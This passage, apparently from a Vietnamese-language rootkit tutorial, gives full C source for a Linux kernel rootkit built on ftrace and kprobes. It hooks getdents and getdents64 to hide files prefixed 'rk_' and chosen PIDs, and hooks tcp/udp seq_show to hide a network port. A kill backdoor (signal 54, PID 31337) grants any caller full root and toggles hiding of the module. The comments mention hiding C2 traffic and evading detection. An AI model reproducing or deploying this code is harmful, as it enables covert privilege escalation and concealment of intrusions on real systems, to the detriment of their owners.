     *   [kernel] → target_func ──ftrace──→ callback
     *                                       ├─ parent_ip OUTSIDE module
     *                                       └─ redirect to hook
     *
     *   [hook]  → orig_func   ──ftrace──→ callback
     *                                       ├─ parent_ip INSIDE module
     *                                       └─ DON'T redirect, let original run
     */
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;

    /* regs->ip = instruction pointer.
     * Thay đổi ip = thay đổi NƠI CPU sẽ execute tiếp theo.
     * Khi ftrace callback return, CPU jump tới regs->ip
     * = hook function address thay vì original function.
     *
     * Đây là kỹ thuật tương tự EIP/RIP overwrite trong exploitation,
     * nhưng legitimate qua ftrace API. */
}

/* ══════════════════════════════════════════════════════════════
 * HOOK INSTALLATION — Register ftrace handler cho target function
 * ══════════════════════════════════════════════════════════════ */

static int install_ftrace_hook(struct ftrace_hook *hook)
{
    int err;

    /* Step 1: Resolve target function address */
    hook->address = rk_lookup_name(hook->name);
    if (!hook->address) {
        pr_err("rk: ftrace cannot resolve %s\n", hook->name);
        return -ENOENT;
    }

    /* Step 2: Store original function address.
     *
     * hook->original là con trỏ tới con trỏ:
     *   hook->original = &orig_getdents64  (address của variable)
     *   *hook->original = hook->address     (ghi address vào variable)
     *
     * Sau dòng này:
     *   orig_getdents64 = address_of___x64_sys_getdents64
     *   → Hook function có thể gọi orig_getdents64(regs) */
    *((unsigned long *)hook->original) = hook->address;

    /* Step 3: Configure ftrace_ops.
     *
     * func: callback function (ftrace_thunk)
     *
     * flags:
     *   FTRACE_OPS_FL_SAVE_REGS: save tất cả registers vào pt_regs
     *     → Cần thiết để ta đọc/modify registers (đặc biệt regs->ip)
     *     → Nếu không set, regs = NULL trong callback
     *
     *   FTRACE_OPS_FL_IPMODIFY: khai báo rằng ta SẼ modify regs->ip
     *     → Kernel biết để handle conflict với tracers khác
     *     → Chỉ 1 IPMODIFY handler cho 1 function tại 1 thời điểm
     *     → Nếu tracing tool khác đã register IPMODIFY → ta fail
     *
     *   FTRACE_OPS_FL_RECURSION: (kernel 5.11+)
     *     → Cho phép recursion protection tự động
     *     → Trước 5.11 phải tự check (within_module trick) */
    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_IPMODIFY;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 11, 0)
    hook->ops.flags |= FTRACE_OPS_FL_RECURSION;
#endif

    /* Step 4: Set filter — CHỈ trace target function.
     *
     * Không set filter = trace MỌI function = system crawl.
     * ftrace_set_filter_ip(): "chỉ gọi callback khi function
     * tại address này execute."
     *
     * Params:
     *   ops:     ftrace handle
     *   ip:      target function address
     *   remove:  0 = add filter, 1 = remove filter
     *   reset:   0 = append to existing, 1 = reset filter list */
    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        pr_err("rk: ftrace_set_filter_ip failed: %d\n", err);
        return err;
    }

    /* Step 5: Register — Activate hook.
     *
     * Sau lệnh này, mỗi khi target function được gọi:
     * 1. CPU execute __fentry__ tại đầu function
     * 2. ftrace dispatch tới ftrace_thunk()
     * 3. ftrace_thunk() modify regs->ip → hook function
     * 4. CPU jump tới hook function thay vì tiếp tục original */
    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_err("rk: register_ftrace_function failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    pr_info("rk: ftrace hook installed on %s @ 0x%lx\n",
            hook->name, hook->address);
    return 0;
}

static void remove_ftrace_hook(struct ftrace_hook *hook)
{
    int err;

    /* Unregister trong thứ tự ngược:
     * 1. Unregister function (stop calling callback)
     * 2. Remove filter (cleanup) */
    err = unregister_ftrace_function(&hook->ops);
    if (err)
        pr_err("rk: unregister_ftrace_function failed: %d\n", err);

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err)
        pr_err("rk: ftrace_set_filter_ip remove failed: %d\n", err);

    pr_info("rk: ftrace hook removed from %s\n", hook->name);
}
```

### 4.2 Hook Functions — Full Implementation

```c
/* ftrace_hooks_complete.c — Full hook function implementations
 *
 * Các hook functions dùng với ftrace framework.
 * Mỗi function thay thế một kernel function khi được gọi,
 * thông qua ftrace callback redirect (xem ftrace_thunk).
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * ORIGINAL FUNCTION POINTERS
 *
 * Mỗi pointer lưu address của kernel function gốc.
 * Khi install_ftrace_hook() chạy, nó ghi address vào đây.
 * Hook functions gọi qua pointers này để thực hiện original behavior.
 * ══════════════════════════════════════════════════════════════ */

static asmlinkage long (*ft_orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*ft_orig_getdents)(const struct pt_regs *);
static asmlinkage long (*ft_orig_kill)(const struct pt_regs *);
static int (*ft_orig_tcp4_seq_show)(struct seq_file *, void *);
static int (*ft_orig_udp4_seq_show)(struct seq_file *, void *);
static int (*ft_orig_udp6_seq_show)(struct seq_file *, void *);
static int (*ft_orig_tcp6_seq_show)(struct seq_file *, void *);

/* ──────────────────────────────────────────────────────────────
 * Kiểm tra fd trỏ tới /proc
 *
 * Tại sao tách function: reuse cho cả getdents64 và getdents.
 * fdget/fdput pattern đảm bảo file struct không bị freed
 * trong khi ta đang đọc.
 *
 * Chi tiết:
 *   Mỗi open file trong process có fd → files_struct → file *.
 *   file->f_path.dentry->d_inode->i_sb->s_type->name = fs type.
 *   "proc" = procfs → đang đọc /proc directory.
 *
 *   Cần check vì:
 *   - getdents64 cho /proc → filter PIDs
 *   - getdents64 cho /home → filter filenames
 *   - Phải phân biệt để áp dụng đúng logic
 * ────────────────────────────────────────────────────────────── */
static bool ft_is_proc_fd(int fd)
{
    struct fd f;
    struct inode *inode;
    struct super_block *sb;
    bool result = false;

    f = fdget(fd);
    if (!f.file)
        return false;

    inode = file_inode(f.file);
    if (!inode)
        goto out;

    sb = inode->i_sb;
    if (!sb || !sb->s_type || !sb->s_type->name)
        goto out;

    result = (strcmp(sb->s_type->name, "proc") == 0);

out:
    fdput(f);
    return result;
}

/* ──────────────────────────────────────────────────────────────
 * ft_hooked_getdents64 — FULL IMPLEMENTATION
 *
 * Đây là hook function hoàn chỉnh cho ftrace-based hooking.
 *
 * Flow:
 *   1. Extract arguments từ pt_regs
 *   2. Gọi ft_orig_getdents64 (original handler)
 *   3. Copy userspace buffer vào kernel
 *   4. Iterate mỗi linux_dirent64 entry
 *   5. Quyết định hide hay show cho mỗi entry
 *   6. Nếu hide: xóa entry khỏi buffer
 *   7. Copy buffer modified trở lại userspace
 *   8. Return adjusted byte count
 *
 * Hide criteria:
 *   a) Filename bắt đầu bằng HIDDEN_PREFIX ("rk_")
 *   b) Entry là PID directory trong /proc và PID nằm trong hidden list
 *   c) Entry là tên module rootkit (cho /proc/modules backup hiding)
 * ────────────────────────────────────────────────────────────── */
static asmlinkage long ft_hooked_getdents64(const struct pt_regs *regs)
{
    /* ── Extract syscall arguments từ registers ──
     *
     * Trên x86-64 kernel >= 4.17, syscall handlers nhận pt_regs *:
     *   regs->di = arg1 = unsigned int fd
     *   regs->si = arg2 = struct linux_dirent64 __user *dirent
     *   regs->dx = arg3 = unsigned int count (buffer size)
     *
     * __user annotation: pointer trỏ vào userspace memory.
     * KHÔNG ĐƯỢC dereference trực tiếp — phải dùng copy_from_user.
     */
    int fd = (int)regs->di;
    struct linux_dirent64 __user *user_dirent =
        (struct linux_dirent64 __user *)regs->si;

    /* Gọi original syscall handler.
     *
     * ft_orig_getdents64 = address của __x64_sys_getdents64 gốc.
     * Được save khi install_ftrace_hook() chạy.
     *
     * Sau call này:
     *   - user_dirent buffer (userspace) đã được kernel fill
     *   - ret = tổng bytes data trong buffer
     *   - ret = 0 → end of directory (không còn entries)
     *   - ret < 0 → error (invalid fd, permission denied, etc.)
     */
    long ret = ft_orig_getdents64(regs);

    /* Locals */
    struct linux_dirent64 *kern_buf = NULL;
    struct linux_dirent64 *cur = NULL;
    struct linux_dirent64 *prev = NULL;
    unsigned long offset = 0;
    bool proc_dir = false;
    long adjusted_ret;

    /* Nothing to filter */
    if (ret <= 0)
        return ret;

    /* Preserve original return value cho adjustment tracking */
    adjusted_ret = ret;

    /* ── Allocate kernel buffer ──
     *
     * Tại sao cần copy vào kernel:
     *   1. Không thể iterate userspace memory trực tiếp từ kernel
     *      (SMAP: Supervisor Mode Access Prevention sẽ fault)
     *   2. copy_from_user/copy_to_user là kernel API bắt buộc
     *   3. Race condition: nếu process khác modify buffer concurrent
     *      → TOCTOU (Time-of-check-time-of-use) vulnerability
     *   4. Page fault trong kernel = oops nếu page đang swapped out
     *
     * GFP_KERNEL: allocation flag cho process context.
     *   - CÓ THỂ sleep (block nếu hết memory, đợi reclaim)
     *   - KHÔNG dùng trong interrupt/softirq context
     *   - Syscall hook chạy trong process context → GFP_KERNEL OK
     */
    kern_buf = kzalloc(ret, GFP_KERNEL);
    if (!kern_buf)
        return ret;

    /* ── Copy userspace data vào kernel ──
     *
     * copy_from_user(dst_kernel, src_user, size):
     *   Return: 0 = success
     *           N = number of bytes NOT copied (partial failure)
     *
     * Internally:
     *   1. Check user pointer validity (access_ok)
     *   2. Temporarily enable SMAP bypass (stac/clac instructions)
     *   3. Copy with page fault handling
     *   4. Re-enable SMAP
     *
     * Nếu fail (user buffer invalid, unmapped, etc.) → trả ret gốc.
     */
    if (copy_from_user(kern_buf, user_dirent, ret)) {
        kfree(kern_buf);
        return ret;
    }

    /* Check nếu đang đọc /proc (cho PID hiding logic) */
    proc_dir = ft_is_proc_fd(fd);

    /* ── Main filtering loop ──
     *
     * linux_dirent64 entries nằm liên tiếp trong buffer:
     *
     *   kern_buf ──→ ┌─────────────────────┐ offset = 0
     *                │ d_ino    (8 bytes)   │
     *                │ d_off    (8 bytes)   │
     *                │ d_reclen (2 bytes)   │ ← kích thước TOÀN BỘ entry
     *                │ d_type   (1 byte)    │
     *                │ d_name[] (variable)  │ ← null-terminated filename
     *                │ [padding]            │
     *                ├─────────────────────┤ offset += d_reclen
     *                │ next entry...        │
     *                ├─────────────────────┤
     *                │ next entry...        │
     *                └─────────────────────┘ offset == ret (end)
     *
     * d_reclen bao gồm header + name + padding → variable per entry.
     * Ta dùng d_reclen để nhảy từ entry này sang entry kế.
     */
    offset = 0;
    while (offset < adjusted_ret) {
        cur = (struct linux_dirent64 *)((char *)kern_buf + offset);

        /* Validate d_reclen — protect against corruption.
         * d_reclen == 0 → infinite loop. d_reclen > remaining → overread. */
        if (cur->d_reclen == 0 || cur->d_reclen > (adjusted_ret - offset))
            break;

        bool hide_this = false;

        /* ── Rule 1: Hide by filename prefix ──
         *
         * Bất kỳ file/directory nào có tên bắt đầu bằng HIDDEN_PREFIX
         * sẽ bị ẩn khỏi ls, find, readdir, và mọi tool dùng getdents.
         *
         * strncmp so sánh N bytes đầu tiên.
         * Nếu match → file invisible.
         *
         * Ví dụ: HIDDEN_PREFIX = "rk_"
         *   "rk_config"    → HIDDEN
         *   "rk_backdoor"  → HIDDEN
         *   "readme.txt"   → visible
         */
        if (strncmp(cur->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0) {
            hide_this = true;
        }

        /* ── Rule 2: Hide PID directories trong /proc ──
         *
         * /proc chứa numbered directories cho mỗi process:
         *   /proc/1/     → init/systemd
         *   /proc/1234/  → process PID 1234
         *   /proc/self/  → symlink tới current process
         *
         * Khi ps/top đọc /proc, chúng getdents64 → thấy "1", "1234", etc.
         * → Rồi stat mỗi PID directory để lấy process info.
         *
         * Nếu ta remove PID entry khỏi getdents64 result:
         *   → ps/top KHÔNG thấy process → invisible.
         *   → Process VẪN chạy (scheduler không dùng /proc).
         *
         * Chỉ filter khi:
         *   a) fd trỏ tới /proc (proc_dir == true)
         *   b) d_name là numeric string (PID, không phải "cpuinfo")
         *   c) PID nằm trong hidden_pids list
         */
        if (proc_dir && !hide_this) {
            long pid_val;
            if (kstrtol(cur->d_name, 10, &pid_val) == 0) {
                if (is_pid_hidden((pid_t)pid_val))
                    hide_this = true;
            }
        }

        /* ── Rule 3: Hide rootkit module entry khi đọc /proc/modules
         *    (đã handled ở Rule 1 nếu module name có HIDDEN_PREFIX)
         *    Nếu module name không có prefix, thêm explicit check ở đây */

        /* ── Perform hiding ── */
        if (hide_this) {
            if (cur == kern_buf) {
                /* Entry đầu tiên: shift mọi thứ phía sau lên.
                 *
                 * Trước:
                 *   [HIDDEN entry][entry B][entry C]
                 *    ^offset=0    ^reclen   ...
                 *
                 * Sau memmove:
                 *   [entry B][entry C]
                 *   adjusted_ret giảm đi d_reclen của HIDDEN
                 *
                 * memmove (không phải memcpy) vì source và dest overlap.
                 */
                adjusted_ret -= cur->d_reclen;
                if (adjusted_ret > 0) {
                    memmove(cur,
                            (char *)cur + cur->d_reclen,
                            adjusted_ret);
                }
                /* Không tăng offset — vị trí hiện tại giờ chứa
                 * entry kế (đã shift), cần kiểm tra lại. */
                continue;
            }

            /* Entry ở giữa hoặc cuối: "nuốt" vào entry trước.
             *
             * Nguyên lý: mỗi entry tự khai báo kích thước (d_reclen).
             * Userspace dùng d_reclen để tính offset entry kế:
             *   next_entry = (char *)current + current->d_reclen
             *
             * Nếu ta tăng d_reclen của entry trước:
             *   prev->d_reclen += cur->d_reclen
             *
             * → Userspace nhảy TỪ prev THẲNG tới entry SAU cur.
             * → cur bị skip (vẫn nằm trong memory nhưng unreachable).
             *
             * Trước:
             *   [prev, reclen=32] [HIDDEN, reclen=48] [next entry]
             *
             * Sau:
             *   [prev, reclen=80]                     [next entry]
             *   (prev "nuốt" 48 bytes của HIDDEN)
             */
            if (prev)
                prev->d_reclen += cur->d_reclen;
        } else {
            /* Entry visible — track làm prev cho potential future hide */
            prev = cur;
        }

        offset += cur->d_reclen;
    }

    /* ── Copy filtered buffer trở lại userspace ──
     *
     * copy_to_user(dst_user, src_kernel, size):
     *   Ghi adjusted_ret bytes (có thể < ret gốc) vào user buffer.
     *
     * Userspace sẽ thấy:
     *   - Ít entries hơn (hidden entries đã bị remove)
     *   - Return value nhỏ hơn (adjusted_ret < ret)
     *   - Hoàn toàn transparent — ls, find, etc. hoạt động bình thường
     *     nhưng không list hidden entries.
     */
    if (adjusted_ret > 0)
        copy_to_user(user_dirent, kern_buf, adjusted_ret);

    kfree(kern_buf);
    return adjusted_ret;
}

/* ──────────────────────────────────────────────────────────────
 * ft_hooked_getdents — Hook cho legacy getdents (32-bit compat)
 *
 * Một số tools cũ hoặc 32-bit binaries dùng getdents thay vì
 * getdents64. Phải hook CẢ HAI để không bị bypass.
 *
 * struct linux_dirent (32-bit version):
 *   unsigned long  d_ino;
 *   unsigned long  d_off;
 *   unsigned short d_reclen;
 *   char           d_name[];
 *   // d_type nằm SAU d_name (khác 64-bit version)
 *
 * Logic giống getdents64 nhưng dùng struct khác.
 * ────────────────────────────────────────────────────────────── */

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

static asmlinkage long ft_hooked_getdents(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    struct linux_dirent __user *user_dirent =
        (struct linux_dirent __user *)regs->si;
    long ret = ft_orig_getdents(regs);
    struct linux_dirent *kern_buf, *cur, *prev = NULL;
    unsigned long offset = 0;
    long adjusted_ret;
    bool proc_dir;

    if (ret <= 0) return ret;

    adjusted_ret = ret;
    kern_buf = kzalloc(ret, GFP_KERNEL);
    if (!kern_buf) return ret;
    if (copy_from_user(kern_buf, user_dirent, ret)) {
        kfree(kern_buf);
        return ret;
    }

    proc_dir = ft_is_proc_fd(fd);

    while (offset < adjusted_ret) {
        cur = (void *)kern_buf + offset;
        if (cur->d_reclen == 0 || cur->d_reclen > (adjusted_ret - offset))
            break;

        bool hide_this = false;

        if (strncmp(cur->d_name, HIDDEN_PREFIX,
                    strlen(HIDDEN_PREFIX)) == 0)
            hide_this = true;

        if (proc_dir && !hide_this) {
            long pid_val;
            if (kstrtol(cur->d_name, 10, &pid_val) == 0)
                if (is_pid_hidden((pid_t)pid_val))
                    hide_this = true;
        }

        if (hide_this) {
            if (cur == kern_buf) {
                adjusted_ret -= cur->d_reclen;
                if (adjusted_ret > 0)
                    memmove(cur, (char *)cur + cur->d_reclen,
                            adjusted_ret);
                continue;
            }
            if (prev) prev->d_reclen += cur->d_reclen;
        } else {
            prev = cur;
        }
        offset += cur->d_reclen;
    }

    if (adjusted_ret > 0)
        copy_to_user(user_dirent, kern_buf, adjusted_ret);
    kfree(kern_buf);
    return adjusted_ret;
}
```

### 4.3 ft_hooked_kill — Full Version

```c
/* ft_hooked_kill — FULL VERSION
 *
 * 3 commands qua magic signal:
 *   kill -54 31337  → give root cho calling process
 *   kill -54 31338  → toggle ẩn/hiện module
 *   kill -54 <PID>  → toggle ẩn/hiện process <PID>
 */

static asmlinkage long ft_hooked_kill(const struct pt_regs *regs)
{
    pid_t target_pid = (pid_t)regs->di;
    int sig = (int)regs->si;

    /* Chỉ intercept magic signal */
    if (sig != MAGIC_SIGNAL)
        return ft_orig_kill(regs);

    /* ──── Command 1: Give Root ────
     *
     * kill(31337, 54) → calling process trở thành root.
     *
     * prepare_creds() tạo bản copy mutable của current credentials.
     * Set tất cả UIDs/GIDs = 0 + full capabilities.
     * commit_creds() atomic swap.
     */
    if (target_pid == MAGIC_PID) {
        struct cred *new_cred = prepare_creds();
        if (new_cred) {
            /* Set all identity fields to root */
            new_cred->uid.val  = new_cred->gid.val  = 0;
            new_cred->euid.val = new_cred->egid.val = 0;
            new_cred->suid.val = new_cred->sgid.val = 0;
            new_cred->fsuid.val = new_cred->fsgid.val = 0;

            /* Full capabilities — unrestricted root */
            new_cred->cap_effective   = CAP_FULL_SET;
            new_cred->cap_permitted   = CAP_FULL_SET;
            new_cred->cap_inheritable = CAP_FULL_SET;
            new_cred->cap_bset        = CAP_FULL_SET;
            new_cred->cap_ambient     = CAP_FULL_SET;

            commit_creds(new_cred);
        }
        return 0;
    }

    /* ──── Command 2: Toggle Module Visibility ────
     *
     * kill(31338, 54) → ẩn/hiện rootkit module.
     *
     * Khi ẩn: module biến mất khỏi lsmod, /proc/modules, /sys/module/
     * Khi hiện: module xuất hiện trở lại (cần cho rmmod cleanup).
     *
     * module_hidden: global bool track trạng thái hiện tại.
     * rk_hide_module() / rk_show_module() = DKOM functions từ Chapter 6.
     */
    if (target_pid == HIDE_MODULE_PID) {
        if (module_hidden) {
            rk_show_module();
            module_hidden = false;
            pr_info("rk: module visible\n");
        } else {
            rk_hide_module();
            module_hidden = true;
            pr_info("rk: module hidden\n");
        }
        return 0;
    }

    /* ──── Command 3: Toggle Process Hiding ────
     *
     * kill(<PID>, 54) → ẩn/hiện process có PID đó.
     *
     * Nếu PID đang hidden → show lại.
     * Nếu PID đang visible → hide.
     *
     * is_pid_hidden() / add_hidden_pid() / remove_hidden_pid()
     * là helper functions quản lý hidden PID list (Chapter 3).
     *
     * Khi PID trong hidden list:
     *   - getdents64 hook filter /proc/<PID> directory entry
     *   - ps, top, htop không thấy process
     *   - Process VẪN chạy bình thường (scheduler không dùng /proc)
     */
    if (is_pid_hidden(target_pid)) {
        remove_hidden_pid(target_pid);
        pr_info("rk: PID %d visible\n", target_pid);
    } else {
        add_hidden_pid(target_pid);
        pr_info("rk: PID %d hidden\n", target_pid);
    }

    return 0;
}
```

### 4.4 Network Connection Hiding — tcp4_seq_show, udp4_seq_show, IPv6

```c
/*
 * Hook tcp4_seq_show — ẨN NETWORK CONNECTIONS
 *
 * Đây là ưu điểm của ftrace: hook INTERNAL kernel function,
 * không chỉ syscalls. tcp4_seq_show() là function output mỗi dòng
 * trong /proc/net/tcp. Không thể hook function này qua syscall table.
 *
 * /proc/net/tcp là nơi netstat/ss đọc TCP connections.
 * Mỗi dòng = 1 connection. Ẩn dòng = ẩn connection.
 *
 * tcp4_seq_show(struct seq_file *seq, void *v):
 *   seq = output buffer (seq_file framework)
 *   v   = pointer tới current iteration element
 *         v == SEQ_START_TOKEN → header line
 *         v == struct sock *   → connection entry
 *
 * Flow: kernel iterate hash table → gọi tcp4_seq_show cho mỗi sock
 *       → output vào seq_file → user đọc /proc/net/tcp
 *
 * Hook: nếu sock->sk_num (local port) hoặc sk_dport (remote port)
 *       match HIDDEN_PORT → return 0 (skip, không output dòng này).
 */
static int ft_hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;

    /* Header line (column names) — luôn cho qua */
    if (v == SEQ_START_TOKEN)
        return ft_orig_tcp4_seq_show(seq, v);

    /* v là pointer tới struct inet_timewait_sock hoặc struct sock.
     * Cast an toàn vì tcp4_seq_show code gốc cũng cast tương tự. */
    sk = (struct sock *)v;

    /* Check ports.
     * sk_num  = local port (host byte order)
     * sk_dport = remote port (NETWORK byte order → cần ntohs)
     *
     * Tại sao khác byte order: sk_num được set bởi bind() đã convert.
     * sk_dport giữ nguyên từ packet header (network byte order). */
    if (sk->sk_num == HIDDEN_PORT ||
        ntohs(sk->sk_dport) == HIDDEN_PORT) {
        /* Return 0 = "đã xử lý" nhưng không output gì.
         * seq_file framework thấy return 0 → chuyển sang entry kế.
         * Dòng output cho connection này bị suppressed. */
        return 0;
    }

    return ft_orig_tcp4_seq_show(seq, v);
}

/* ──────────────────────────────────────────────────────────────
 * Ẩn UDP connections từ /proc/net/udp
 *
 * /proc/net/udp output tương tự /proc/net/tcp:
 *   Mỗi dòng = 1 UDP socket đang listen hoặc active.
 *   Tools: ss -u, netstat -u đọc từ đây.
 *
 * Hook udp4_seq_show() giống tcp4_seq_show():
 *   Nếu port match → return 0 (suppress output).
 *
 * Tại sao cần hook UDP riêng:
 *   - TCP và UDP dùng KHÁC seq_operations struct
 *   - tcp4_seq_show ≠ udp4_seq_show
 *   - DNS (53), SNMP (161), syslog (514) dùng UDP
 *   - C2 qua DNS tunneling = UDP traffic cần ẩn
 * ────────────────────────────────────────────────────────────── */

static int ft_hooked_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;

    /* SEQ_START_TOKEN = header line. Luôn cho qua.
     *
     * Header:
     *   "  sl  local_address rem_address   st tx_queue ..."
     * Ẩn header = tools parse fail → suspicious. */
    if (v == SEQ_START_TOKEN)
        return ft_orig_udp4_seq_show(seq, v);

    sk = (struct sock *)v;

    /* Check source port (local) và destination port.
     *
     * UDP socket structure:
     *   sk->sk_num   = local port mà socket bind()
     *   sk->sk_dport = remote port (nếu connected UDP)
     *
     * UDP thường stateless nên sk_dport có thể = 0
     * cho unconnected sockets (listen-only).
     *
     * Check sk_num đủ để ẩn listening UDP sockets. */
    if (sk->sk_num == HIDDEN_PORT ||
        ntohs(sk->sk_dport) == HIDDEN_PORT) {
        return 0;  /* Suppress: dòng này không xuất hiện */
    }

    return ft_orig_udp4_seq_show(seq, v);
}

/* ──────────────────────────────────────────────────────────────
 * Ẩn UDP6 connections (/proc/net/udp6) — IPv6
 *
 * Nếu server dùng IPv6, cần hook udp6_seq_show() nữa.
 * Logic hoàn toàn giống, chỉ khác tên function.
 * ────────────────────────────────────────────────────────────── */

static int ft_hooked_udp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;

    if (v == SEQ_START_TOKEN)
        return ft_orig_udp6_seq_show(seq, v);

    sk = (struct sock *)v;

    if (sk->sk_num == HIDDEN_PORT ||
        ntohs(sk->sk_dport) == HIDDEN_PORT)
        return 0;

    return ft_orig_udp6_seq_show(seq, v);
}

/* TCP6 tương tự */

static int ft_hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk;
    if (v == SEQ_START_TOKEN)
        return ft_orig_tcp6_seq_show(seq, v);
    sk = (struct sock *)v;
    if (sk->sk_num == HIDDEN_PORT ||
        ntohs(sk->sk_dport) == HIDDEN_PORT)
        return 0;
    return ft_orig_tcp6_seq_show(seq, v);
}
```

### 4.5 Hook Table & Lifecycle

```c
/* ══════════════════════════════════════════════════════════════
 * HOOK TABLE — Khai báo tất cả hooks
 *
 * Mỗi entry map: target function name → hook function → original pointer
 * install_ftrace_hook() iterate table này để setup từng hook.
 * ══════════════════════════════════════════════════════════════ */

static struct ftrace_hook ft_hooks[] = {
    HOOK(SYSCALL_PREFIX "getdents64",
         ft_hooked_getdents64, &ft_orig_getdents64),
    HOOK(SYSCALL_PREFIX "getdents",
         ft_hooked_getdents, &ft_orig_getdents),
    HOOK(SYSCALL_PREFIX "kill",
         ft_hooked_kill, &ft_orig_kill),
    HOOK("tcp4_seq_show",
         ft_hooked_tcp4_seq_show, &ft_orig_tcp4_seq_show),
    HOOK("udp4_seq_show",
         ft_hooked_udp4_seq_show, &ft_orig_udp4_seq_show),
    HOOK("udp6_seq_show",
         ft_hooked_udp6_seq_show, &ft_orig_udp6_seq_show),
    HOOK("tcp6_seq_show",
         ft_hooked_tcp6_seq_show, &ft_orig_tcp6_seq_show),
};

/* Install all hooks */
int rk_ftrace_install(void)
{
    int i, err;

    for (i = 0; i < ARRAY_SIZE(ft_hooks); i++) {
        err = install_ftrace_hook(&ft_hooks[i]);
        if (err) {
            /* Rollback: remove hooks đã install */
            while (--i >= 0)
                remove_ftrace_hook(&ft_hooks[i]);
            return err;
        }
    }
    return 0;
}

/* Remove all hooks */
void rk_ftrace_remove(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(ft_hooks); i++)
        remove_ftrace_hook(&ft_hooks[i]);
}
```

---

## Chapter 5: Kprobe/Kretprobe Hooking

```c
/* kprobe_hooks.c — Kprobe-based hooking
 *
 * Kprobes = Kernel Probes. Debug framework cho phép chèn
 * breakpoint tại bất kỳ instruction nào trong kernel.
 *
 * SO SÁNH VỚI FTRACE:
 *   Kprobe:  hook tại BẤT KỲ instruction, không chỉ function entry
 *            → flexible hơn (hook giữa function, hook specific instructions)
 *   Ftrace:  chỉ hook tại function entry (__fentry__)
 *            → cleaner API, ít overhead
 *
 * Kprobe types:
 *   1. kprobe:     trigger tại INSTRUCTION — chạy handler TRƯỚC instruction
 *   2. kretprobe:  trigger tại FUNCTION RETURN — chạy handler TRƯỚC return
 *   3. jprobe:     deprecated (removed trong kernel 4.15)
 *
 * Kretprobe đặc biệt hữu ích cho rootkit:
 *   → hook function return → modify RETURN VALUE
 *   → Ví dụ: sys_getdents64 return count → giảm count = ẩn entries
 *
 * CÁCH KPROBE HOẠT ĐỘNG (internal):
 *
 *   1. Kernel save instruction gốc tại probe point
 *   2. Replace bằng INT3 (0xCC) — breakpoint instruction
 *   3. Khi CPU hit INT3 → trap handler chạy
 *   4. Trap handler gọi registered kprobe handlers
 *   5. Execute original instruction (single-step)
 *   6. Continue execution
 *
 *   Kretprobe additionally:
 *   1. Replace return address trên stack bằng trampoline
 *   2. Khi function return → jump tới trampoline
 *   3. Trampoline gọi kretprobe handler
 *   4. Handler có thể modify return value (regs->ax)
 *   5. Jump tới original return address
 *
 * Detection:
 *   /sys/kernel/debug/kprobes/list — liệt kê mọi active kprobes
 *   → Admin check file này = thấy rootkit hooks
 *   → Rootkit nâng cao: hook việc ĐỌC file này :)
 */

#include "rootkit.h"

/* ══════════════════════════════════════════════════════════════
 * KRETPROBE: Hook sys_getdents64 RETURN
 *
 * Kretprobe hook tại RETURN POINT. Khi sys_getdents64() chuẩn bị
 * return, handler chạy → có thể modify return value và data.
 *
 * Ưu điểm so với pre-hook:
 *   - Data đã trong userspace buffer → modify trước khi user thấy
 *   - Return value (count) có thể giảm → phản ánh filtered data
 *   - Không cần biết function internals, chỉ cần biết output
 *
 * Vấn đề:
 *   - Kretprobe có giới hạn maxactive (concurrent instances)
 *   - Nếu vượt maxactive → handler bị miss cho một số calls
 *   - Set maxactive cao = dùng nhiều memory
 * ══════════════════════════════════════════════════════════════ */

/* Instance data — lưu thông tin giữa entry và return.
 *
 * Khi function entry: save arguments (vì registers sẽ bị overwrite)
 * Khi function return: dùng saved arguments để xử lý
 *
 * Mỗi concurrent call có instance data riêng (per-invocation storage).
 */
struct getdents64_data {
    struct linux_dirent64 __user *dirent;  /* Saved userspace buffer pointer */
    int fd;                                 /* Saved file descriptor */
};

/*
 * Entry handler — chạy khi sys_getdents64 BẮT ĐẦU execute.
 *
 * Mục đích: save arguments trước khi bị overwrite bởi function body.
 * Trong kretprobe, handler chỉ chạy lúc RETURN — lúc đó registers
 * đã thay đổi, không còn arguments. Nên phải save ở entry.
 *
 * ri->data: pointer tới instance storage (struct getdents64_data)
 *           Mỗi concurrent invocation có data riêng.
 */
static int getdents64_entry(struct kretprobe_instance *ri,
                             struct pt_regs *regs)
{
    struct getdents64_data *data =
        (struct getdents64_data *)ri->data;

    /* Save arguments từ registers.
     * regs->di = arg1 (fd)
     * regs->si = arg2 (dirent buffer pointer)
     * Cần save vì lúc return, di/si đã bị overwrite. */
    data->fd     = (int)regs->di;
    data->dirent = (struct linux_dirent64 __user *)regs->si;

    return 0;  /* 0 = proceed, non-zero = skip this invocation */
}

/*
 * Return handler — chạy khi sys_getdents64 CHUẨN BỊ return.
 *
 * Tại thời điểm này:
 *   - Function đã execute xong
 *   - Return value = regs->ax (total bytes of dirent data)
 *   - Userspace buffer đã được fill bởi kernel
 *   - Ta có thể modify buffer VÀ return value
 */
static int getdents64_return(struct kretprobe_instance *ri,
                              struct pt_regs *regs)
{
    struct getdents64_data *data =
        (struct getdents64_data *)ri->data;

    long ret = regs_return_value(regs);  /* = regs->ax = return value */
    struct linux_dirent64 *kern_buf;
    struct linux_dirent64 *current_entry, *prev_entry;
    unsigned long offset;

    if (ret <= 0)
        return 0;

    kern_buf = kzalloc(ret, GFP_ATOMIC);
    /* GFP_ATOMIC: kretprobe handler CÓ THỂ chạy trong atomic context
     * (nơi không thể sleep). GFP_KERNEL sẽ crash nếu need to sleep.
